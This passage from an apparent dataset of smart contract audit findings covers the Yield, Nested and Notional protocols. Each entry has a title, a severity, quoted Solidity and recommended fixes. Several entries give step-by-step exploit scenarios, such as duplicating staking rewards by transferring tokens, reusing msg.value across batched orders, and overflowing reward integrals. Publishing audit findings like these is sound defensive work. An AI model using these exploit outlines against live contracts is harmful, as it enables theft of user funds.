Recommend adding `onlyWhitelist` modifier to `rebalanceTrigger()`, which allows retaining the convenience of (only whitelisted) bots checking before calling rebalance. This makes it only a little safer because one can always front-run the actual rebalance call. This will only force bots to monitor `mempool` for rebalances instead of arbing ahead of time. Revisit this aspect for any missed considerations."
17.md,Rational actors will just set themselves as referral,low,"When depositing, a referral can be chosen and the only check is:

```solidity
account != address(0) && referral != address(0) && referrals[account] == address(0)
```

This means that users can refer themselves. It's not immediately clear from the contracts that are part of this repo, what the referrals are used for. If they are used for anything, rational actors will always refer themselves to maximize profits making the referral system useless.

Recommend whitelisting big influencers that are allowed to be used as referrals to avoid everyone referring themselves or another account they control."
80.md,Malicious Users Can Duplicate Protocol Earned Yield By Transferring `wCVX` Tokens To Another Account,high,"`ConvexYieldWrapper.sol` is a wrapper contract for staking convex tokens on the user's behalf, allowing them to earn rewards on their deposit. Users will interact with the `Ladle.sol` contract's `batch()` function which:

*   Approves Ladle to move the tokens.
*   Transfers the tokens to `ConvexYieldWrapper.sol`.
*   Wraps/stakes these tokens.
*   Updates accounting and produces debt tokens within `Ladle.sol`.

During `wrap()` and `unwrap()` actions, `_checkpoint()` is used to update the rewards for the `from_` and `to_` accounts. However, the [reference](https://github.com/convex-eth/platform/blob/main/contracts/contracts/wrappers/ConvexStakingWrapper.sol#L395-L397) contract implements a `_beforeTokenTransfer()` function which has been removed from Yield Protocol's custom implementation.

As a result, it is possible to transfer `wCVX` tokens to another account after an initial checkpoint has been made. By manually calling `user_checkpoint()` on the new account, this user is able to update its deposited balance of the new account while the sender's balance is not updated. This can be repeated to effectively replicate a user's deposited balance over any number of accounts. To claim yield generated by the protocol, the user must only make sure that the account calling `getReward()` holds the tokens for the duration of the call.

#### Proof of Concept

The exploit can be outlined through the following steps:

*   Alice receives 100 `wCVX` tokens from the protocol after wrapping their convex tokens.
*   At that point in time, `_getDepositedBalance()` returns 100 as its result. A checkpoint has also been made on this balance, giving Alice claim to her fair share of the rewards.
*   Alice transfers her tokens to her friend Bob who then manually calls `user_checkpoint()` to update his balance.
*   Now from the perspective of the protocol, both Alice and Bob have 100 `wCVX` tokens as calculated by the `_getDepositedBalance()` function.
*   If either Alice or Bob wants to claim rewards, all they need to do is make sure the 100 `wCVX` tokens are in their account upon calling `getReward()`. Afterwards, the tokens can be transferred out.

#### Tools Used

Manual code review.
Discussion/confirmation with the Yield Protocol team.

#### Recommended Mitigation Steps

Consider implementing the `_beforeTokenTransfer()` function as shown in the [reference](https://github.com/convex-eth/platform/blob/main/contracts/contracts/wrappers/ConvexStakingWrapper.sol#L395-L397) contract. However, it is important to ensure the wrapper contract and collateral vaults are excluded from the checkpointing so they are not considered in the rewards calculations.


 





***"
80.md,Malicious Users Can Transfer Vault Collateral To Other Accounts To Extract Additional Yield From The Protocol,high,"`ConvexYieldWrapper.sol` is a wrapper contract for staking convex tokens on the user's behalf, allowing them to earn rewards on their deposit. Users will interact with the `Ladle.sol` contract's `batch()` function which:

*   Approves Ladle to move the tokens.
*   Transfers the tokens to `ConvexYieldWrapper.sol`.
*   Wraps/stakes these tokens.
*   Updates accounting and produces debt tokens within `Ladle.sol`.

`_getDepositedBalance()` takes into consideration the user's total collateral stored in all of their owned vaults. However, as a vault owner, you are allowed to give the vault to another user, move collateral between vaults and add/remove collateral. Therefore, it is possible to manipulate the result of this function by checkpointing one user's balance at a given time, transferring ownership to another user and then create a new checkpoint with this user.

As a result, a user is able to generate protocol yield multiple times over on a single collateral amount. This can be abused to effectively extract all protocol yield.

#### Proof of Concept

Consider the following exploit scenario:

*   Alice owns a vault which has 100 tokens worth of collateral.
*   At that point in time, `_getDepositedBalance()` returns 100 as its result. A checkpoint has also been made on this balance, giving Alice claim to her fair share of the rewards.
*   Alice then calls `Ladle.give()`, transferring the ownership of the vault to Bob and calls `ConvexYieldWrapper.addVault()`.
*   Bob is able to call `user_checkpoint()` and effectively update their checkpointed balance.
*   At this point in time, both Alice and Bob have claim to any yield generated by the protocol, however, there is only one vault instance that holds the underlying collateral.

<https://github.com/code-423n4/2022-01-yield/blob/main/contracts/ConvexYieldWrapper.sol#L100-L120>
```solidity
function _getDepositedBalance(address account_) internal view override returns (uint256) {
    if (account_ == address(0) || account_ == collateralVault) {
        return 0;
    }

    bytes12[] memory userVault = vaults[account_];

    //add up all balances of all vaults registered in the wrapper and owned by the account
    uint256 collateral;
    DataTypes.Balances memory balance;
    uint256 userVaultLength = userVault.length;
    for (uint256 i = 0; i < userVaultLength; i++) {
        if (cauldron.vaults(userVault[i]).owner == account_) {
            balance = cauldron.balances(userVault[i]);
            collateral = collateral + balance.ink;
        }
    }

    //add to balance of this token
    return _balanceOf[account_] + collateral;
}
```

#### Tools Used

Manual code review.
Discussion/confirmation with the Yield Protocol team.

#### Recommended Mitigation Steps

Ensure that any change to a vault will correctly checkpoint the previous and new vault owner. The affected actions include but are not limited to; transferring ownership of a vault to a new account, transferring collateral to another vault and adding/removing collateral to/from a vault.








***"
80.md,Oracle data feed is insufficiently validated,medium,"Price can be stale and can lead to wrong `quoteAmount` return value

#### Proof of Concept

Oracle data feed is insufficiently validated. There is no check for stale price and round completeness.
Price can be stale and can lead to wrong `quoteAmount` return value

```javascript
function _peek(
    bytes6 base,
    bytes6 quote,
    uint256 baseAmount
) private view returns (uint256 quoteAmount, uint256 updateTime) {
    ...

    (, int256 daiPrice, , , ) = DAI.latestRoundData();
    (, int256 usdcPrice, , , ) = USDC.latestRoundData();
    (, int256 usdtPrice, , , ) = USDT.latestRoundData();

    require(
        daiPrice > 0 && usdcPrice > 0 && usdtPrice > 0,
        ""Chainlink pricefeed reporting 0""
    );

    ...
}
```

#### Recommended Mitigation Steps

Validate data feed

```javascript
function _peek(
    bytes6 base,
    bytes6 quote,
    uint256 baseAmount
) private view returns (uint256 quoteAmount, uint256 updateTime) {
    ...
    (uint80 roundID, int256 daiPrice, , uint256 timestamp, uint80 answeredInRound) = DAI.latestRoundData();
    require(daiPrice > 0, ""ChainLink: DAI price <= 0"");
    require(answeredInRound >= roundID, ""ChainLink: Stale price"");
    require(timestamp > 0, ""ChainLink: Round not complete"");

    (roundID, int256 usdcPrice, , timestamp, answeredInRound) = USDC.latestRoundData();
    require(usdcPrice > 0, ""ChainLink: USDC price <= 0"");
    require(answeredInRound >= roundID, ""ChainLink: Stale USDC price"");
    require(timestamp > 0, ""ChainLink: USDC round not complete"");

    (roundID, int256 usdtPrice, , timestamp, answeredInRound) = USDT.latestRoundData();
    require(usdtPrice > 0, ""ChainLink: USDT price <= 0"");
    require(answeredInRound >= roundID, ""ChainLink: Stale USDT price"");
    require(timestamp > 0, ""ChainLink: USDT round not complete"");

    ...
}
```






***"
80.md,Rewards distribution can be disrupted by a early user,medium,"<https://github.com/code-423n4/2022-01-yield/blob/e946f40239b33812e54fafc700eb2298df1a2579/contracts/ConvexStakingWrapper.sol#L206-L224>

```solidity
function _calcRewardIntegral(
    uint256 _index,
    address[2] memory _accounts,
    uint256[2] memory _balances,
    uint256 _supply,
    bool _isClaim
) internal {
    RewardType storage reward = rewards[_index];

    uint256 rewardIntegral = reward.reward_integral;
    uint256 rewardRemaining = reward.reward_remaining;

    //get difference in balance and remaining rewards
    //getReward is unguarded so we use reward_remaining to keep track of how much was actually claimed
    uint256 bal = IERC20(reward.reward_token).balanceOf(address(this));
    if (_supply > 0 && (bal - rewardRemaining) > 0) {
        rewardIntegral = uint128(rewardIntegral) + uint128(((bal - rewardRemaining) * 1e20) / _supply);
        reward.reward_integral = uint128(rewardIntegral);
    }
```

`reward.reward_integral` is `uint128`, if a early user mint (wrap) just `1` Wei of `convexToken`, and make `_supply == 1`, and then tranferring `5e18` of `reward_token` to the contract.

As a result, `reward.reward_integral` can exceed `type(uint128).max` and overflow, causing the rewards distribution to be disrupted.

##### Recommendation

Consider `wrap` a certain amount of initial totalSupply, e.g. `1e8`, and never burn it. And consider using uint256 instead of uint128 for `reward.reward_integral`. Also, consdier lower `1e20` down to `1e12`.







***"
53.md,Copy your own portfolio to keep earning royalties,high,"#### Impact
In `NestedFactory.sol` going through the `create()` function which leads to the `sendFeesWithRoyalties()` => `addShares()` function,  Im not seeing any checks preventing someone from copying their own portfolio and receiving royalty shares for it and simply repeating the process over and over again.

#### Proof of Concept
- [`FeeSplitter.sol` L152](https://github.com/code-423n4/2021-11-nested/blob/main/contracts/FeeSplitter.sol#L152)
- [`FeeSplitter.sol` L220](https://github.com/code-423n4/2021-11-nested/blob/main/contracts/FeeSplitter.sol#L220)
- [`NestedFactory.sol` L103](https://github.com/code-423n4/2021-11-nested/blob/main/contracts/NestedFactory.sol#L103)
- [`NestedAsset.sol` L69](https://github.com/code-423n4/2021-11-nested/blob/main/contracts/NestedAsset.sol#L69)
- [`NestedFactory.sol` L103](https://github.com/code-423n4/2021-11-nested/blob/main/contracts/NestedFactory.sol#L103)
- [`NestedFactory.sol` L491](https://github.com/code-423n4/2021-11-nested/blob/main/contracts/NestedFactory.sol#L491)

#### Tools Used
Manual code review

#### Recommended Mitigation Steps
A require statement should be added not allowing users to copy their own portfolios."
53.md,`setReserve()` can be front-run,medium,"#### Impact
The `reserve` address variable in NestedFactory.sol remains equal to 0 before the `setReserve()` function is called by an owner. This may lead to incorrect transfers of tokens or invalid comparison with e.g., the asset reserve (nestedRecords.getAssetReserve(\_nftId) == address(reserve)), should they occur before the value for `reserve` was set.
In addition, the immutabiliy of the `reserve` variable requires extra caution when setting the value.

#### Proof of Concept
`setReserve()`: [`NestedFactory.sol` L89](https://github.com/code-423n4/2021-11-nested/blob/5d113967cdf7c9ee29802e1ecb176c656386fe9b/contracts/NestedFactory.sol#L89)

#### Tools Used
Manual Analysis

#### Recommended Mitigation Steps
Consider initializing the value for the `reserve` variable in the constructor."
53.md,FeeSplitter: No sanity check to prevent shareholder from being added twice.,medium,"#### Impact
It is possible for duplicate shareholders to be added. These shareholders will get more than intended when `_sendFee()` is called.

#### Recommended Mitigation Steps
Ensure that the `_accounts` array is sorted in `setShareholders()`.

```jsx
for (uint256 i = 0; i < _accounts.length; i++) {
	if (i > 0) {
		require(_accounts[i - 1] < _accounts[i], ""FeeSplitter: ACCOUNTS_NOT_SORTED"");
	}
	_addShareholder(_accounts[i], _weights[i]);
}
```"
53.md,NestedFactory: Ensure zero msg.value if transferring from user and `inputToken` is not ETH,medium,"#### Impact
A user that mistakenly calls either `create()` or `addToken()` with WETH (or another ERC20) as the input token, but includes native ETH with the function call will have his native ETH permanently locked in the contract.

#### Recommended Mitigation Steps
It is best to ensure that `msg.value = 0` in `_transferInputTokens()` for the scenario mentioned above.

```jsx
} else if (address(_inputToken) == ETH) {
	...
} else {
	require(msg.value == 0, ""NestedFactory::_transferInputTokens: ETH sent for non-ETH transfer"");
  _inputToken.safeTransferFrom(_msgSender(), address(this), _inputTokenAmount);
}
```"
53.md,FeeSplitter: Unbounded number of shareholders can cause DOS,medium,"#### Impact
There is no limit to the number of shareholders. It is therefore possible to set a large number of shareholders such that `_sendFees()` will run out of gas when adding shares to each shareholder.
This will cause denial of service to all NestedFactory functions, especially the ones that will remove funds like `withdraw()` and `destroy()`.

#### Recommended Mitigation Steps
It would be best to set a sanity maximum number of shareholders that can be added."
53.md,isResolverCached() will always return false after removing operator,medium,"#### Impact
While there is no loss of funds, removing an operator will cause the cache functionality to be permanently broken. If there was a function that had a modifier which requires the cache to be synced before the function can be called, it would not be callable as well.

The underlying issue is how the `bytes32` operator is removed from the array when `removeOperator()` is called. Its value gets deleted (set to 0x0), but isn't taken out of the array.

#### Proof of Concept
For ease of reading, we use abbreviated strings like `0xA`, `0xB` for `bytes32` and `address` types.

1.  Import 3 operators by calling `OperatorResolver.importOperators([0xA, 0xB, 0xC], [0x1, 0x2, 0x3)`.
2.  Call `NestedFactory.addOperator()` 3 times to push these 3 operators into the `operators` state variable.
3.  Call `NestedFactory.rebuildCache()` to build the cache.
4.  Let's say the second operator `0xB` is to be removed. Taking reference from the `removeOperator.ts` script, `OperatorResolver.importOperators([0xA, 0xB, 0xC], [0x1, 0x2, 0x3)` is called first. This works because OperatorResolver uses a mapping(bytes32 ⇒ address) to represent the operators. Hence, by setting `0xB`'s destination address to be the null address, it is like as if he was never an operator.
5.  Call `NestedFactory.rebuildCache()` to rebuild the cache. `resolverAddressesRequired()` will return `[0xA, 0xB, 0xC]`. `0xB` will be removed from `addressCache` because `resolver.getAddress(0xB)` returns 0x000 since it has been deleted from the OperatorResolver.
6.  Call `NestedFactory.removeOperator(0xB)`. The `operators` array now looks like this: `[0xA, 0x0, 0xC]`.
7.  When you try to call `NestedFactory.isResolverCached`, it will always return false because of the null `bytes32` value, where `addressCache[0x0]` will always return the null address.

#### Recommended Mitigation Steps
Instead of doing an element deletion, it should be replaced with the last element, then have the last element popped in `removeOperator()`.

```jsx
function removeOperator(bytes32 operator) external override onlyOwner {
	for (uint256 i = 0; i < operators.length; i++) {
		if (operators[i] == operator) {
			operators[i] = operators[operators.length - 1];
			operators.pop();
			break;
		}
	}
}
```"
53.md,`NestedFactory.sol#_submitInOrders()` Wrong implementation cause users to be overcharged,medium,"When executing orders, the actual `amountSpent + feesAmount` can be lower than `_inputTokenAmount`, the unspent amount should be returned to the user.

However, in the current implementation, the unspent amount will be taken as part of the fee.
[`NestedFactory.sol` L285-L309](https://github.com/code-423n4/2021-11-nested/blob/f646002b692ca5fa3631acfff87dda897541cf41/contracts/NestedFactory.sol#L285-L309)

```solidity
function _submitInOrders(
    uint256 _nftId,
    IERC20 _inputToken,
    uint256 _inputTokenAmount,
    Order[] calldata _orders,
    bool _reserved,
    bool _fromReserve
) private returns (uint256 feesAmount, IERC20 tokenSold) {
    _inputToken = _transferInputTokens(_nftId, _inputToken, _inputTokenAmount, _fromReserve);
    uint256 amountSpent;
    for (uint256 i = 0; i < _orders.length; i++) {
        amountSpent += _submitOrder(address(_inputToken), _orders[i].token, _nftId, _orders[i], _reserved);
    }
    feesAmount = _calculateFees(_msgSender(), amountSpent);
    assert(amountSpent <= _inputTokenAmount - feesAmount); // overspent

    // If input is from the reserve, update the records
    if (_fromReserve) {
        _decreaseHoldingAmount(_nftId, address(_inputToken), _inputTokenAmount);
    }

    _handleUnderSpending(_inputTokenAmount - feesAmount, amountSpent, _inputToken);

    tokenSold = _inputToken;
}
```

##### Recommendation

Change to:

```solidity
function _submitInOrders(
    uint256 _nftId,
    IERC20 _inputToken,
    uint256 _inputTokenAmount,
    Order[] calldata _orders,
    bool _reserved,
    bool _fromReserve
) private returns (uint256 feesAmount, IERC20 tokenSold) {
    _inputToken = _transferInputTokens(_nftId, _inputToken, _inputTokenAmount, _fromReserve);
    uint256 amountSpent;
    for (uint256 i = 0; i < _orders.length; i++) {
        amountSpent += _submitOrder(address(_inputToken), _orders[i].token, _nftId, _orders[i], _reserved);
    }
    feesAmount = _calculateFees(_msgSender(), amountSpent);
    assert(amountSpent <= _inputTokenAmount - feesAmount); // overspent

    // If input is from the reserve, update the records
    if (_fromReserve) {
        _decreaseHoldingAmount(_nftId, address(_inputToken), amountSpent+feesAmount);
    }

    ExchangeHelpers.setMaxAllowance(_token, address(feeSplitter));
    feeSplitter.sendFees(_token, feesAmount);

    if (_inputTokenAmount > amountSpent + feesAmount) {
        _inputToken.transfer(_fromReserve ? address(reserve) : _msgSender(), _inputTokenAmount - amountSpent - feesAmount);
    }

    tokenSold = _inputToken;
}
```"
53.md,Ensure on-chain that cache is synced,medium,"#### Impact
Currently, many core operations (like `NestedFactory.create()`, `NestedFactory.swapTokenForTokens()`) are dependent on the assumption that the cache is synced before these functions are executed however this may not necessarily be the case.

#### Proof of Concept
1.  `OperatorResolver.importOperators()` is called to remove an operator.
2.  A user calls `NestedFactory.create()` that uses the operator that was being removed / updated.
3.  `NestedFactory.rebuildCache()` is called to rebuild cache.

This flow is not aware that the cache is not in synced.

#### Recommended Mitigation Steps
Add a modifier to require that the cache is synced to all functions that interact with the operators."
53.md,Passing multiple ETH deposits in orders array will use the same `msg.value` many times,medium,"#### Impact
Contract holdings can be emptied as malicious user will do deposit/withdraw to extract value. This is possible because after `transferInputTokens` system uses contract balance for user's operations, assuming that equivalent value was transferred.

#### Proof of Concept
`msg.value` persist over calls, so passing `'Order[] calldata _orders'` holding multiple ETH deposits will use the same msg.value in each of them, resulting in multiple deposits, that sums up to much bigger accounted value than actually deposited value, up to contract's ETH holdings.

create / `addTokens` -> `submitInOrders` -> `transferInputTokens`
- [`NestedFactory.sol` L103](https://github.com/code-423n4/2021-11-nested/blob/main/contracts/NestedFactory.sol#L103)
- [`NestedFactory.sol` L119](https://github.com/code-423n4/2021-11-nested/blob/main/contracts/NestedFactory.sol#L119)

`sellTokensToWallet` -> `submitOutOrders` -> `transferInputTokens`
- [`NestedFactory.sol` L172](https://github.com/code-423n4/2021-11-nested/blob/main/contracts/NestedFactory.sol#L172)

`sellTokensToNft` -> `submitOutOrders` -> `transferInputTokens`
- [`NestedFactory.sol` L152](https://github.com/code-423n4/2021-11-nested/blob/main/contracts/NestedFactory.sol#L152)
`transferInputTokens` uses msg.value:

[`NestedFactory.sol` L462](https://github.com/code-423n4/2021-11-nested/blob/main/contracts/NestedFactory.sol#L462)
#### Recommended Mitigation Steps

Controlling ETH to be only once in orders will not help, as `NestedFactory` inherits from `Multicall`, which` multicall(bytes\[] calldata data)` function allows same reusage of msg.value, which will persist over calls.

So, it is recommended to treat ETH exclusively, not allowing ETH operations to be batched at all."
81.md,Treasury cannot claim COMP tokens & COMP tokens are stuck,high,"The `TreasuryAction.claimCOMPAndTransfer` function uses pre- and post-balances of the `COMP` token to check which ones to transfer:

```solidity
function claimCOMPAndTransfer(address[] calldata cTokens)
    external
    override
    onlyManagerContract
    nonReentrant
    returns (uint256)
{
    // Take a snasphot of the COMP balance before we claim COMP so that we don't inadvertently transfer
    // something we shouldn't.
    uint256 balanceBefore = COMP.balanceOf(address(this));
    // @audit anyone can claim COMP on behalf of this contract and then it's stuck. https://github.com/compound-finance/compound-protocol/blob/master/contracts/Comptroller.sol#L1328
    COMPTROLLER.claimComp(address(this), cTokens);
    // NOTE: If Notional ever lists COMP as a collateral asset it will be cCOMP instead and it
    // will never hold COMP balances directly. In this case we can always transfer all the COMP
    // off of the contract.
    uint256 balanceAfter = COMP.balanceOf(address(this));
    uint256 amountClaimed = balanceAfter.sub(balanceBefore);
    // NOTE: the onlyManagerContract modifier prevents a transfer to address(0) here
    COMP.safeTransfer(treasuryManagerContract, amountClaimed);
    // NOTE: TreasuryManager contract will emit a COMPHarvested event
    return amountClaimed;
}
```

Note that anyone can claim COMP tokens on behalf of any address (see [`Comptroller.claimComp`](https://github.com/compound-finance/compound-protocol/blob/master/contracts/Comptroller.sol#L1328)).
An attacker can claim COMP tokens on behalf of the contract and it'll never be able to claim any compound itself.
The COMP claimed by the attacker are stuck in the contract and cannot be retrieved.
(One can eventually get back the stuck COMP by creating a cCOMP market and then transferring it through `transferReserveToTreasury`.)

#### Recommended Mitigation Steps

Don't use pre-and post-balances, can you use the entire balance?





***"
81.md,Cooldown and redeem windows can be rendered useless,high,"Cooldown and redeem windows can be rendered useless.

#### Proof of Concept

*   Given an account that has not staked sNOTE.
*   Account calls sNOTE.startCooldown
*   Account waits for the duration of the cooldown period. Redeem period starts.
*   Account can then deposit and redeem as they wish, making the cooldown useless.
*   Multiple accounts could be used to ""hop"" between redeem windows by transfering between them, making the redeem window effictively useless.

Could be used for voting power attacks using flash loan if voting process is not monitored
<https://www.coindesk.com/tech/2020/10/29/flash-loans-have-made-their-way-to-manipulating-protocol-elections/>

#### Tools Used

*   VS Code

#### Recommended Mitigation Steps

A few ways to mitigate this problem:
Option A: Remove the cooldown/redeem period as it's not really preventing much in current state.
Option B: Let the contract start the cooldown on mint, and bind the cooldown/redeem window to the amount that was minted at that time by the account. Don't make sNOTE.startCooldown() available externally. Redeem should verify amount of token available using this new logic.






***"
81.md,A Malicious Treasury Manager Can Burn Treasury Tokens By Setting `makerFee` To The Amount The Maker Receives,high,"The treasury manager contract holds harvested assets/`COMP` from Notional which are used to perform `NOTE` buybacks or in other areas of the protocol. The manager account is allowed to sign off-chain orders used on 0x to exchange tokens to `WETH` which can then be deposited in the Balancer LP and distributed to `sNOTE` holders.

However, `_validateOrder` does not validate that `takerFee` and `makerFee` are set to zero, hence, it is possible for a malicious manager to receive tokens as part of a swap, but the treasury manager contract receives zero tokens as `makerFee` is set to the amount the maker receives. This can be abused to effectively burn treasury tokens at no cost to the order taker.

#### Proof of Concept

<https://github.com/0xProject/0x-monorepo/blob/0571244e9e84b9ad778bccb99b837dd6f9baaf6e/contracts/exchange/contracts/src/MixinExchangeCore.sol#L196-L250>

<https://github.com/0xProject/0x-monorepo/blob/0571244e9e84b9ad778bccb99b837dd6f9baaf6e/contracts/exchange-libs/contracts/src/LibFillResults.sol#L59-L91>

<https://github.com/code-423n4/2022-01-notional/blob/main/contracts/utils/EIP1271Wallet.sol#L147-L188>
```solidity
function _validateOrder(bytes memory order) private view {
    (
        address makerToken,
        address takerToken,
        address feeRecipient,
        uint256 makerAmount,
        uint256 takerAmount
    ) = _extractOrderInfo(order);

    // No fee recipient allowed
    require(feeRecipient == address(0), ""no fee recipient allowed"");

    // MakerToken should never be WETH
    require(makerToken != address(WETH), ""maker token must not be WETH"");

    // TakerToken (proceeds) should always be WETH
    require(takerToken == address(WETH), ""taker token must be WETH"");

    address priceOracle = priceOracles[makerToken];

    // Price oracle not defined
    require(priceOracle != address(0), ""price oracle not defined"");

    uint256 slippageLimit = slippageLimits[makerToken];

    // Slippage limit not defined
    require(slippageLimit != 0, ""slippage limit not defined"");

    uint256 oraclePrice = _toUint(
        AggregatorV2V3Interface(priceOracle).latestAnswer()
    );

    uint256 priceFloor = (oraclePrice * slippageLimit) /
        SLIPPAGE_LIMIT_PRECISION;

    uint256 makerDecimals = 10**ERC20(makerToken).decimals();

    // makerPrice = takerAmount / makerAmount
    uint256 makerPrice = (takerAmount * makerDecimals) / makerAmount;

    require(makerPrice >= priceFloor, ""slippage is too high"");
}
```

#### Recommended Mitigation Steps

Consider checking that `makerFee == 0` and `takerFee == 0` in `EIP1271Wallet._validateOrder` s.t. the treasury manager cannot sign unfair orders which severely impact the `TreasuryManager` contract.





***"
81.md,Usage of deprecated ChainLink API in `EIP1271Wallet`,medium,"The Chainlink API (`latestAnswer`) used in the `EIP1271Wallet` contract is deprecated:

> This API is deprecated. Please see API Reference for the latest Price Feed API. [Chainlink Docs](https://web.archive.org/web/20210304160150/https://docs.chain.link/docs/deprecated-aggregatorinterface-api-reference)

This function does not error if no answer has been reached but returns 0. Besides, the `latestAnswer` is reported with 18 decimals for crypto quotes but 8 decimals for FX quotes (See Chainlink FAQ for more details). A best practice is to get the decimals from the oracles instead of hard-coding them in the contract.

#### Recommended Mitigation Steps

Use the `latestRoundData` function to get the price instead. Add checks on the return data with proper revert messages if the price is stale or the round is uncomplete, for example:

```solidity
(uint80 roundID, int256 price, , uint256 timeStamp, uint80 answeredInRound) = priceOracle.latestRoundData();
require(answeredInRound >= roundID, ""..."");
require(timeStamp != 0, ""..."");
```




***"
81.md,`sNOTE.sol#_mintFromAssets()` Lack of slippage control,medium,"https://github.com/code-423n4/2022-01-notional/blob/d171cad9e86e0d02e0909eb66d4c24ab6ea6b982/contracts/sNOTE.sol#L195-L209

```solidity
BALANCER_VAULT.joinPool{value: msgValue}(
    NOTE_ETH_POOL_ID,
    address(this),
    address(this), // sNOTE will receive the BPT
    IVault.JoinPoolRequest(
        assets,
        maxAmountsIn,
        abi.encode(
            IVault.JoinKind.EXACT_TOKENS_IN_FOR_BPT_OUT,
            maxAmountsIn,
            0 // Accept however much BPT the pool will give us
        ),
        false // Don't use internal balances
    )
);
```

The current implementation of `mintFromNOTE()` and `mintFromETH()` and `mintFromWETH()` (all are using `_mintFromAssets()` with `minimumBPT` hardcoded to `0`) provides no parameter for slippage control, making it vulnerable to front-run attacks.

##### Recommendation

Consider adding a `minAmountOut` parameter for these functions.







***"
81.md,No upper limit on `coolDownTimeInSeconds` allows funds to be locked sNOTE owner,medium,"Inability for sNOTE holders to exit the pool in the case of ownership over SNOTE contract being compromised/malicious.

#### Proof of Concept

sNOTE works on a stkAAVE model where users have to wait a set cooldown period before being able to reclaim the underlying tokens. This cooldown period can be set to an arbitrary uint32 value in seconds by the owner of the sNOTE contract.

<https://github.com/code-423n4/2022-01-notional/blob/d171cad9e86e0d02e0909eb66d4c24ab6ea6b982/contracts/sNOTE.sol#L94-L97>

Below in the `startCooldown()` function, it's possible for the owner of the sNOTE contract to choose a value for `coolDownTimeInSeconds` which always causes this function to revert (`_safe32` will always revert if `coolDownTimeInSeconds = type(uint32).max`).

<https://github.com/code-423n4/2022-01-notional/blob/d171cad9e86e0d02e0909eb66d4c24ab6ea6b982/contracts/sNOTE.sol#L217-L226>

Should ownership over sNOTE become compromised then all of the users' assets may be locked indefinitely.

#### Recommended Mitigation Steps

Provide a sensible upper limit to `coolDownTimeInSeconds` of, say, a month. This will give plenty of time for NOTE governance to withdraw funds in the event of a shortfall while giving confidence that a user's funds can't be locked forever.




***"
81.md,MAX_SHORTFALL_WITHDRAW limit on BTP extraction is not enforced,medium,"The function `extractTokensForCollateralShortfall()` allows the owner of the sNote contract to withdraw up to 50% of the total amount of BPT.

Presumably, this 50% limit is in place to prevent the owner from ""rug-pulling"" the sNote holders (or at least to give them a guarantee that their loss is limited to 50% of the underlying value).

However, this limit is easily circumvented as the function can simply be called a second, third and fourth time, to withdraw almost all of the BPT.

As the contract does not enforce this limit, the bug requires stakers to trust the governance to not withdraw more than 50% of the underlying collateral. This represents a higher risk for the stakers, which may  also result in a larger discount on sNote wrt its BPT collateral (this is why I classified the bug as medium risk - users may lose value - not from an exploit, but from the lack of enforcing the 50% rule)

### Proof of Concept

See above.
The code affected is here: <https://github.com/code-423n4/2022-01-notional/blob/main/contracts/sNOTE.sol#L100>

#### Recommended Mitigation Steps

Rewrite the logic and enforce a limit during a time period - i.e. do not allow to withdraw over 50% *per week* (or any time period that is longer than the cooldown period, so that users have time to withdraw their collateral)







***"
81.md,`sNOTE` Holders Are Not Incetivized To Vote On Proposals To Call `extractTokensForCollateralShortfall`,medium,"As `sNOTE` have governance voting rights equivalent to the token amount in `NOTE`, users who stake their `NOTE` are also able to vote on governance proposals. In the event a majority of `NOTE` is staked in the `sNOTE` contract, it doesn't seem likely that stakers would be willing to vote on a proposal which liquidates a portion of their staked position.

Hence, the protocol may be put into a state where stakers are unwilling to vote on a proposal to call `extractTokensForCollateralShortfall`, leaving Notional insolvent as stakers continue to dump their holdings.

#### Proof of Concept

<https://github.com/code-423n4/2022-01-notional/blob/main/contracts/sNOTE.sol#L99-L129>
```solidity
function extractTokensForCollateralShortfall(uint256 requestedWithdraw) external nonReentrant onlyOwner {
    uint256 bptBalance = BALANCER_POOL_TOKEN.balanceOf(address(this));
    uint256 maxBPTWithdraw = (bptBalance * MAX_SHORTFALL_WITHDRAW) / 100;
    // Do not allow a withdraw of more than the MAX_SHORTFALL_WITHDRAW percentage. Specifically don't
    // revert here since there may be a delay between when governance issues the token amount and when
    // the withdraw actually occurs.
    uint256 bptExitAmount = requestedWithdraw > maxBPTWithdraw ? maxBPTWithdraw : requestedWithdraw;

    IAsset[] memory assets = new IAsset[](2);
    assets[0] = IAsset(address(WETH));
    assets[1] = IAsset(address(NOTE));
    uint256[] memory minAmountsOut = new uint256[](2);
    minAmountsOut[0] = 0;
    minAmountsOut[1] = 0;

    BALANCER_VAULT.exitPool(
        NOTE_ETH_POOL_ID,
        address(this),
        payable(owner), // Owner will receive the NOTE and WETH
        IVault.ExitPoolRequest(
            assets,
            minAmountsOut,
            abi.encode(
                IVault.ExitKind.EXACT_BPT_IN_FOR_TOKENS_OUT,
                bptExitAmount
            ),
            false // Don't use internal balances
        )
    );
}
```

#### Recommended Mitigation Steps

Consider redesigning this mechanism to better align stakers with the health of the protocol. It might be useful to allocate a percentage of generated fees to an insurance fund which will be used to cover any collateral shortfall events. This fund can be staked to generate additional yield.





***"
81.md,`getVotingPower` Is Not Equipped To Handle On-Chain Voting,medium,"As `NOTE` continues to be staked in the `sNOTE` contract, it is important that Notional's governance is able to correctly handle on-chain voting by calculating the relative power `sNOTE` has in terms of its equivalent `NOTE` amount.

`getVotingPower` is a useful function in tracking the relative voting power a staker has, however, it does not utilise any checkpointing mechanism to ensure the user's voting power is a snapshot of a specific block number. As a result, it would be possible to manipulate a user's voting power by casting a vote on-chain and then have them transfer their `sNOTE` to another account to then vote again.

#### Proof of Concept

<https://github.com/code-423n4/2022-01-notional/blob/main/contracts/sNOTE.sol#L271-L293>
```solidity
function getVotingPower(uint256 sNOTEAmount) public view returns (uint256) {
    // Gets the BPT token price (in ETH)
    uint256 bptPrice = IPriceOracle(address(BALANCER_POOL_TOKEN)).getLatest(IPriceOracle.Variable.BPT_PRICE);
    // Gets the NOTE token price (in ETH)
    uint256 notePrice = IPriceOracle(address(BALANCER_POOL_TOKEN)).getLatest(IPriceOracle.Variable.PAIR_PRICE);
    
    // Since both bptPrice and notePrice are denominated in ETH, we can use
    // this formula to calculate noteAmount
    // bptBalance * bptPrice = notePrice * noteAmount
    // noteAmount = bptPrice/notePrice * bptBalance
    uint256 priceRatio = bptPrice * 1e18 / notePrice;
    uint256 bptBalance = BALANCER_POOL_TOKEN.balanceOf(address(this));

    // Amount_note = Price_NOTE_per_BPT * BPT_supply * 80% (80/20 pool)
    uint256 noteAmount = priceRatio * bptBalance * 80 / 100;

    // Reduce precision down to 1e8 (NOTE token)
    // priceRatio and bptBalance are both 1e18 (1e36 total)
    // we divide by 1e28 to get to 1e8
    noteAmount /= 1e28;

    return (noteAmount * sNOTEAmount) / totalSupply();
}
```

#### Recommended Mitigation Steps

